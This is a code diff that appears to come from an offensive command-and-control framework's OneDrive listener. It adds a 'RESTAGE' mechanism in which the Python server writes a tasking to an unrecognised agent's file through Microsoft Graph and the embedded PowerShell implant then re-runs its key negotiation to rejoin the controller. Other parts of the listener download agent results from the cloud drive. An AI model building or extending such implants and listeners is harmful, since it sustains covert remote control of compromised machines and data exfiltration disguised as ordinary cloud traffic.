@@ -420,6 +420,11 @@ class Listener:
             if($data -and ($data.length -ne 0)) {
                 $wc = Get-WebClient
                 $null = $wc.UploadString("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$($script:SessionID).txt", "DELETE", "")
+                if([system.text.encoding]::utf8.getString($data) -eq "RESTAGE") {
+                    write-host "Restaging"
+                    Start-Negotiate -T $script:TokenObject.token -SK $SK -PI $PI -UA $UA
+                }
+                write-host "returning"
                 $Data
             }
         }
@@ -680,15 +685,18 @@ class Listener:
                     try:
                         agent_id = item['name'].split(".")[0]
                         if not agent_id in agent_ids:
-                            dispatcher.send("[*] Invalid agent, deleting %s/%s" % (results_folder, item['name']), sender="listeners/onedrive")
+                            dispatcher.send("[*] Invalid agent, deleting %s/%s and restaging" % (results_folder, item['name']), sender="listeners/onedrive")
+                            s.put("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id), data = "RESTAGE")
                             s.delete("%s/drive/items/%s" % (base_url, item['id']))
                             continue
+
                         try:
                             seen_time = datetime.strptime(item['lastModifiedDateTime'], "%Y-%m-%dT%H:%M:%S.%fZ")
                         except: #sometimes no ms for some reason...
                             seen_time = datetime.strptime(item['lastModifiedDateTime'], "%Y-%m-%dT%H:%M:%SZ")
                         seen_time = helpers.utc_to_local(seen_time)
                         self.mainMenu.agents.update_agent_lastseen_db(agent_id, seen_time)
+
                         if(item['size'] > 1): #only need to download results if there's actually something there
                             dispatcher.send("[*] Downloading results from %s/%s, %d bytes" % (results_folder, item['name'], item['size']), sender="listeners/onedrive")
                             r = s.get(item['@microsoft.graph.downloadUrl'])
